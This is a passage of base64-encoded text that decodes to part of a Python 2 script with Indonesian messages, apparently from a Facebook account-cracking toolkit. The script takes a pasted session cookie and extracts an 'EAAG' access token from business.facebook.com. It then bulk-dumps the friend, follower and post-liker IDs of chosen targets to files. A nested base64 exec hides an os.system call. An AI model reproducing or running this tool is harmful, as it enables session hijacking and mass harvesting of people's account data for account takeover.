iUoVSx0aWwsSCxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2lhcGthbiBha3VuIGZhY2Vib29rICh3YWppYiBha3VuIHR1bWJhbCkiKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW5rYW4gYWt1biBmYWNlYm9vayAodHVtYmFsKSBkaSBicm93c2VyICVzQ2hyb21lICVzIiUoTyxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHVybCBhbGFtYXQgd2FqaWIgJXNodHRwczovL20uZmFjZWJvb2suY29tICVzKG1vZGUgZGF0YSkiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gc2FsaW4gbGluayA6ICVzdmlldy1zb3VyY2U6aHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiUoTykpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlcyAtIHRhcnVoIGxpbmsgdGVyc2VidXQgZGkgdXJsIGFsYW1hdCBmYWNlYm9vayBsYWx1IGtsaWsgY2FyaSAiJShIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIGppa2Egc3VkYWgsIGtsaWsgJXN0aXRpayB0aWdhICVzcG9qb2sga2FuYW4gYXRhcyAiJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0ga2VtdWRpYW4ga2xpayAlc0NhcmkgZGkgSGFsYW1hbiAlcyIlKE8sSCkpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIgLSBrZXRpayAlc0VBQUcgJXNha2FuIG11bmN1bCBhY2NlcyB0b2tlbi4iJShPLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gamlrYSBzdWRhaCBqYW5nYW4gbHVwYSBkaSBzYWxpbiBcbiIpO2plZGEoMC4wMikNCiAgICAgICAgcHJpbnQgKCIlc+KAoiVzIFVudHVrIG1lbmRhcGF0a2FuIGNvb2tpZSAlczolcyAiJShVLEgsTSxIKSk7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNpYXBrYW4gYXBsaWthc2kga2l3aSBicm93c2VyLCBkb3dubG9hZCBkaSBwbGF5IHN0b3JlIGppa2EgYmVsdW0iKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiIC0gbG9naW4ga2FuIGFrdW4gZmFjZWJvb2sgYW5kYSBkaSBraXdpIGJyb3dzZXIuIGFrdW4gd2FqaWIgbW9kZSBkYXRhIik7amVkYSgwLjAyKQ0KICAgICAgICBwcmludCAoIiAtIHNhbGluIGxpbmsgOiAlc2h0dHBzOi8vY2hyb21lLmdvb2dsZS5jb20vd2Vic3RvcmUvZGV0YWlsL2dldC1jb29raWUvbmFjaWFhZ2JraWZocG5vb2Rsa2hiZWpqbGRhaWZmY20vcmVsYXRlZCIlKE8pKTtqZWRhKDAuMDIpDQogICAgICAgIHByaW50ICgiICVzLSBrZXRpayAlc24lcy8lc04gJXNsYWx1IGVudGVyIHVudHVrIG1lbGloYXQgdHV0b3JpYWxcbiAiJShILE0sTyxNLEgpKTtqZWRhKDAuMDIpDQogICAgICAgIG5hbnlhID0gcmF3X2lucHV0KCclcyVzJXMgQW5kYSBwYWhhbT8gJXN5JXMvJXNuIDolcyAnJShVLHRpbCxPLEgsTyxNLEspKQ0KICAgICAgICBpZiBuYW55YSBpbigiIik6DQogICAgICAgIAlwcmludCAoIiVzJXMgc2F5YSBiZXJ0YW55YSB3YWppYiBkaSBqYXdhYiAiJShNLHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJ5IiwiWSIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgc2VsYW1hdCBhbmRhIHBpbnRhciA6KiAiJShILHRpbCkpO2plZGEoMik7bWFzdWsoKQ0KICAgICAgICBlbGlmIG5hbnlhIGluKCJuIiwiTiIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgYnVrYSBkZW5nYW4gZmFjZWJvb2sgIiUoTSx0aWwpKTtqZWRhKDIpO29zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MS9wb3N0cy8yMzE2NTA2OTU3NzE4NDgvP2FwcD1mYmwiKTttYXN1aygpDQogICAgZWxpZiByb20gaW4gKCcwJywgJzAwJyk6DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgIAlwcmludCgiJXMlcyB3cm9uZyBpbnB1dCAiJShNLHRpbCkpO2V4aXQoKQ0KIyBDRUsgQ09PS0lFIE1FTlUgNC02DQpob3N0ID0gKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKQ0KdWEgPSAoIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIpDQpoID0geydIb3N0JzogJ21iYXNpYy5mYWNlYm9vay5jb20nLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ3VzZXItYWdlbnQnOiB1YSwgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdC1sYW5ndWFnZSc6ICdpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyd9DQpkZWYgX19yb216X18oKToNCglpZiBvcy5wYXRoLmV4aXN0cygiZGF0YS9jb29raWVzIik6DQoJCWlmIG9zLnBhdGguZ2V0c2l6ZSgiZGF0YS9jb29raWVzIikgIT0wOg0KCQkJcmV0dXJuIGN2ZChvcGVuKCdkYXRhL2Nvb2tpZXMnKS5yZWFkKCkuc3RyaXAoKSkNCgkJZWxzZTpfcm9taVhEXygpDQoJZWxzZTpfcm9taVhEXygpDQpkZWYgX3JvbWlYRF8oc2hvdz1UcnVlKToNCglpZiBzaG93PT1UcnVlOg0KCQkjb3Muc3lzdGVtKCJjbGVhciIpDQoJCSNiYW5uZXIoKQ0KCQlwcmludCgiXG4lcyVzJXMgU3VwYXlhIGJla2VyamEgbWFzdWthbiBjb29raWUgZmFjZWJvb2sgYW5kYSIlKFUsdGlsLE8pKQ0KCWNrPXJhd19pbnB1dCgiJXMjICVzQ29va2llICVzPiAlcyIlKFAsTyxNLEspKQ0KCWlmIGNrPT0iIjoNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCgl0cnk6DQoJCWNrcz1jdmQoY2spDQoJCWlmIGt1ZWgoY2tzKT09VHJ1ZToNCgkJCW9wZW4oImRhdGEvY29va2llcyIsInciKS53cml0ZShjayk7ZXhpdCgiJXMlcyBsb2dpbiBzdWNjZXNzLCBrZXRpazogcHl0aG9uMiBiZmYtMi5weSAiJShILHRpbCkpDQoJCWVsc2U6cHJpbnQoIiVzJXMgbG9naW4gZ2FnYWwuIiUoTSx0aWwpKTtfcm9taVhEXyhzaG93PVRydWUpDQoJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQlwcmludCgiJXMlcyBlcnJvciA6ICVzXG4iJShNLHRpbCxlKSkNCgkJX3JvbWlYRF8oc2hvdz1GYWxzZSkNCmRlZiBrdWVoKGNvb2tpZXMpOg0KCV93dGZfPUZhbHNlDQoJYj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9wcm9maWxlLnBocCIsaGVhZGVycz17J29yaWdpbic6ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nLCAnYWNjZXB0LWxhbmd1YWdlJzogJ2lkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywgJ3VzZXItYWdlbnQnOiB1YSwgJ0hvc3QnOiAoJycpLmpvaW4oYnM0LnJlLmZpbmRhbGwoJzovLyguKj8pJCcsICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nKSksICdyZWZlcmVyJzogJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgnLCAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLCAndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyc6ICcxJywgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnfSxjb29raWVzPWNvb2tpZXMpLnRleHQJDQoJaWYgIm1iYXNpY19sb2dvdXRfYnV0dG9uIiBpbiBiLmxvd2VyKCk6DQoJCV93dGZfPVRydWUNCgkJaWYgX3d0Zl89PVRydWU6DQoJCQlyZXR1cm4gVHJ1ZQ0KCQllbHNlOg0KCQkJZXhpdCgiJXMlcyBsb2dpbiBnYWdhbC4gIiUoTSx0aWwpKQ0KZGVmIGhkY29rKCk6DQogICAgaG9zdHMgPSBob3N0DQogICAgciA9IHsnb3JpZ2luJzogaG9zdHMsICdhY2NlcHQtbGFuZ3VhZ2UnOiAnaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcnLCAnYWNjZXB0LWVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLCAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLCAndXNlci1hZ2VudCc6IHVhLCAnSG9zdCc6ICgnJykuam9pbihiczQucmUuZmluZGFsbCgnOi8vKC4qPykkJywgaG9zdHMpKSwgJ3JlZmVyZXInOiBob3N0cyArICcvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04JywgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJ30NCiAgICByZXR1cm4gcg0KZGVmIGN2cyhjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD1bXQ0KCWZvciBfaV8gaW4gZW51bWVyYXRlKGNvb2tpZXMua2V5cygpKToNCgkJaWYgX2lfWzBdPT1sZW4oY29va2llcy5rZXlzKCkpLTE6cmVzdWx0LmFwcGVuZChfaV9bMV0rIj0iK2Nvb2tpZXNbX2lfWzFdXSkNCgkJZWxzZTpyZXN1bHQuYXBwZW5kKF9pX1sxXSsiPSIrY29va2llc1tfaV9bMV1dKyI7ICIpDQoJcmV0dXJuICIiLmpvaW4ocmVzdWx0KQ0KZGVmIGN2ZChjb29raWVzKTogIyBjb252ZXJ0IGNvb2tpZSBkaWN0IHRvIHN0cmluZw0KCXJlc3VsdD17fQ0KCXRyeToNCgkJZm9yIF9pXyBpbiBjb29raWVzLnNwbGl0KCI7Iik6DQoJCQlyZXN1bHQudXBkYXRlKHtfaV8uc3BsaXQoIj0iKVswXTpfaV8uc3BsaXQoIj0iKVsxXX0pDQoJCXJldHVybiByZXN1bHQNCglleGNlcHQ6DQoJCWZvciBfaV8gaW4gY29va2llcy5zcGxpdCgiOyAiKToNCgkJCXJlc3VsdC51cGRhdGUoe19pXy5zcGxpdCgiPSIpWzBdOl9pXy5zcGxpdCgiPSIpWzFdfSkNCgkJcmV0dXJuIHJlc3VsdA0KIyBDT05WRVJUIENPT0tJRSBLRSBUT0tFTiBCWSBST01JIEFGUklaQUwNCmRlZiBrb252ZXJ0ZXIoKToNCglfY29va2llID0gb3BlbignZGF0YS9jb29raWVzJywgJ3InKS5yZWFkKCkNCglfaGVhZGVyID0gew0KCQknSG9zdCc6J2J1c2luZXNzLmZhY2Vib29rLmNvbScsDQoJCSdjYWNoZS1jb250cm9sJzonbWF4LWFnZT0wJywNCgkJJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOicxJywNCgkJJ3VzZXItYWdlbnQnOidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wLjE7IFJlZG1pIDRBIEJ1aWxkL01NQjI5TSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU5LjAuMzA3MS45MiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsDQoJCSdhY2NlcHQnIDogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KCQknY29udGVudC10eXBlJyA6ICd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnLA0KCQknYWNjZXB0LWVuY29kaW5nJzonZ3ppcCwgZGVmbGF0ZScsDQoJCSdhY2NlcHQtbGFuZ3VhZ2UnOidpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNycsDQoJCSdjb29raWUnOiBfY29va2llDQoJfQ0KCXRyeToNCgkJbGluZyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIiwgaGVhZGVycz1faGVhZGVyKQ0KCQljYXJpID0gcmUuc2VhcmNoKCcoRUFBR1x3KyknLCBsaW5nLnRleHQpDQoJCXJvbXogPSBjYXJpLmdyb3VwKDEpDQoJCWlmICdFQUFHJyBpbiByb216Og0KCQkJcHJpbnQgKCdcbiVzJXMgTG9naW4gc3VjY2VzLCBtb2hvbiB0dW5nZ3UgJyUoSCx0aWwpKQ0KCQkJb3BlbignZGF0YS90b2tlbi50eHQnLCAndycpLndyaXRlKHJvbXopO2xvZ2luX3h4KCkNCgkJCWV4ZWMoYmFzZTY0LmI2NGRlY29kZSgnYjNNdWMzbHpkR1Z0S0NkNFpHY3RiM0JsYmlCb2RIUndjem92TDNkM2R5NW1ZV05sWW05dmF5NWpiMjB2Y205dGFTNWhabkpwZW1Gc0xqRXdNaWNwTzIxbGJuVW9LUT09JykpDQoJCQlleGl0KCkNCglleGNlcHQgQXR0cmlidXRlRXJyb3I6DQoJCXByaW50KCIlc+KAoiB0ZXJqYWRpIGtlc2FsYWhhbiBzYWF0IGNvbnZlcnQsIHBlcmlrc2EgY29va2llIGFuZGEgIiUoTSkpO2V4aXQoKQ0KIyBEVU1QIFBVQkxJSw0KZGVmIHB1Ymxpayhyb216LGhlYWRlcnM9aGVhZGVyKToNCiAgICB0cnk6DQogICAgICAgIG9zLm1rZGlyKCdkdW1wJykNCiAgICBleGNlcHQ6cGFzcw0KICAgIHRyeToNCiAgICAJcHJpbnQgKCJcbiVzJXMgJXNLZXRpayAnJXNtZSVzJyBqaWthIGluZ2luIGR1bXAgZGFmdGFyIHRlbWFuIHNlbmRpcmkgIiUoVSx0aWwsTyxILE8pKQ0KICAgICAgICBpZHQgPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCiAgICAgICAgZ2FzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIG5tID0ganNvbi5sb2FkcyhnYXMudGV4dCkNCiAgICAgICAgZmlsZSA9ICgnZHVtcC8nK25tWydmaXJzdF9uYW1lJ10rJy5qc29uJykucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgYmZmID0gb3BlbihmaWxlLCAndycpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2ZpZWxkcz1mcmllbmRzLmxpbWl0KDUwMDEpJmFjY2Vzc190b2tlbj0lcyclKGlkdCxyb216KSkNCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmb3IgX3hfIGluIHpbJ2ZyaWVuZHMnXVsnZGF0YSddOg0KICAgICAgICAgICAgaWQuYXBwZW5kKF94X1snaWQnXSArICc8PT4nICsgX3hfWyduYW1lJ10pDQogICAgICAgICAgICBiZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQogICAgICAgICAgICBwcmludCAnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSwNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCg0KICAgICAgICBiZmYuY2xvc2UoKQ0KICAgICAgICBwcmludCAoJ1xuXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIGRhcmkgJXMnJShILHRpbCxubVsnbmFtZSddKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBNQVNTQUwgDQpkZWYgbWFzc2FsKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KCXRyeToNCgkJb3MubWtkaXIoJ2R1bXAnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Og0KCQlqdW0gPSBpbnQocmF3X2lucHV0KCdcbiVzJXMlcyBKdW1sYWggaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKSkNCglleGNlcHQ6anVtPTENCglzaW1wYW4gPSByYXdfaW5wdXQoJyVzJXMlcyBOYW1hIGZpbGUlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGRhZnRhciB0ZW1hbiBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCglmaWxlID0gKCdkdW1wLycrc2ltcGFuKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQoJYmZmID0gb3BlbihmaWxlLCAndycpDQoJZm9yIHQgaW4gcmFuZ2UoanVtKToNCgkJdCArPTENCgkJaWR0ID0gcmF3X2lucHV0KCclcyVzICVzVGFyZ2V0IGlkICVzJXMgPiAlcyclKFUsdGlsLE8sdCxNLEspKQ0KCQl0cnk6DQoJCQlmb3IgX3hfIGluIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMiJShpZHQsIHJvbXopKS5qc29uKClbImRhdGEiXToNCgkJCQlpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCgkJCQliZmYud3JpdGUoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSArICdcbicpDQojICAgICAgICAgICAgICBwcmludCAoJ1xyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCVzID4gJXMlcyclKFUsdGlsLE8sTSxILHN0cihsZW4oaWQpKSkpDQojICAgICAgICAgICAgICAsc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlleGl0KCdcbiVzJXMgaWQgdGlkYWsgcHVibGljJyUoTSx0aWwpKQ0KCXRyeToNCgkJYmZmLmNsb3NlKCkNCgkJcHJpbnQgKCclcyVzJXMgVG90YWwgaWQlcyA+ICVzJXMnJShVLHRpbCxPLE0sSCxsZW4oaWQpKSkNCgkJcHJpbnQgKCdcbiVzJXMgU3VjY2VzIGR1bXAgaWQgbWFzc2FsICclKEgsdGlsKSkNCgkJcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCgkJcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCgkJbWVudSgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW1idWF0IGZpbGUnJShNLHRpbCkpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCWV4aXQoJ1xuJXMlcyBnYWdhbCBtZW55aW1wYW4gZmlsZSclKE0sdGlsKSkNCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToNCgkJZXhpdCgnXG4lcyVzIHN0b3AnJShNLHRpbCkpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcbiVzJXMgdGlkYWsgYWRhIGtvbmVrc2knJShNLHRpbCkpDQojIERVTVAgRk9MTE9XRVJTDQpkZWYgZm9sbG93ZXJzKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBmb2xsb3dlcnMgc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzICA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBiYXRhcyA9IHJhd19pbnB1dCgnJXMlcyAlc01heGltYWwgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KICAgICAgICAjc2ltcGFuID0gcmF3X2lucHV0KCclcyVzJXMgTmFtYSBmaWxlJXMgID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIGdhcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUoaWR0LHJvbXopKQ0KICAgICAgICBubSA9IGpzb24ubG9hZHMoZ2FzLnRleHQpDQogICAgICAgIGZpbGUgPSAoJ2R1bXAvJytubVsnZmlyc3RfbmFtZSddKycuanNvbicpLnJlcGxhY2UoJyAnLCAnXycpDQogICAgICAgIGJmZiA9IG9wZW4oZmlsZSwgJ3cnKQ0KICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy9zdWJzY3JpYmVycz9saW1pdD0lcyZhY2Nlc3NfdG9rZW49JXMnJShpZHQsYmF0YXMscm9teikpDQogICAgICAgIHogPSBqc29uLmxvYWRzKHIudGV4dCkNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICgnXHIlcyVzJXMgbWVuZ3VtcHVsa2FuIGlkJXMgPiVzICVzICcgJSAoVSx0aWwsTyxNLEgsc3RyKGxlbihpZCkpKSksDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgwLjAwNTApDQoNCiAgICAgICAgYmZmLmNsb3NlKCkNCiAgICAgICAgcHJpbnQgKCdcblxuJXMlcyBTdWNjZXMgZHVtcCBmb2xsb3dlcnMgZGFyaSAlcyAnJShILHRpbCxubVsibmFtZSJdKSkNCiAgICAgICAgcHJpbnQgKCclcyVzJXMgRmlsZSBkdW1wIHRlcnNpbXBhbiAlcz4lcyAlcyAnJShVLHRpbCxPLE0sSCxmaWxlKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSkNCiAgICAgICAgbWVudSgpDQogICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICBleGl0KCdcbiVzJXMgZ2FnYWwgZHVtcCBpZCclKE0sdGlsKSkNCiAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbWJ1YXQgZmlsZSclKE0sdGlsKSkNCiAgICBleGNlcHQgT1NFcnJvcjoNCiAgICAJZXhpdCgnXG4lcyVzIGdhZ2FsIG1lbnlpbXBhbiBmaWxlJyUoTSx0aWwpKQ0KICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOg0KICAgIAlleGl0KCdcbiVzJXMgc3RvcCclKE0sdGlsKSkNCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgCWV4aXQoJ1xuJXMlcyB0aWRhayBhZGEga29uZWtzaSclKE0sdGlsKSkNCiMgRFVNUCBQT1NUSU5HQU4gDQpkZWYgcG9zdGluZ2FuKHJvbXosaGVhZGVycz1oZWFkZXIpOg0KICAgIHRyeToNCiAgICAgICAgb3MubWtkaXIoJ2R1bXAnKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5Og0KICAgIAlwcmludCAoIlxuJXMlcyAlc1Blcmx1IGRpIGluZ2F0IHBvc3RpbmdhbiBoYXJ1cyBiZXJzaWZhdCBwdWJsaWsgIiUoVSx0aWwsTykpDQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnJXMlcyAlc0lkIHBvc3QlcyAgID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIHNpbXBhbiA9IHJhd19pbnB1dCgnJXMlcyVzIE5hbWEgZmlsZSVzID4gJXMnJShVLHRpbCxPLE0sSykpDQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2xpa2VzP2xpbWl0PTk5OTk5OSZhY2Nlc3NfdG9rZW49JXMnJShpZHQscm9teikpDQogICAgICAgIGlkID0gW10NCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KICAgICAgICBmaWxlID0gKCdkdW1wLycgKyBzaW1wYW4gKyAnLmpzb24nKS5yZXBsYWNlKCcgJywgJ18nKQ0KICAgICAgICBiZmYgPSBvcGVuKGZpbGUsICd3JykNCiAgICAgICAgZm9yIF94XyBpbiB6WydkYXRhJ106DQogICAgICAgICAgICBpZC5hcHBlbmQoX3hfWydpZCddICsgJzw9PicgKyBfeF9bJ25hbWUnXSkNCiAgICAgICAgICAgIGJmZi53cml0ZShfeF9bJ2lkJ10gKyAnPD0+JyArIF94X1snbmFtZSddICsgJ1xuJykNCiAgICAgICAgICAgIHByaW50ICdcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQlcyA+JXMgJXMgJyAlIChVLHRpbCxPLE0sSCxzdHIobGVuKGlkKSkpLA0KICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMC4wMDUwKQ0KDQogICAgICAgIGJmZi5jbG9zZSgpDQogICAgICAgIHByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcG9zdGluZ2FuICclKEgsdGlsKSkNCiAgICAgICAgcHJpbnQgKCclcyV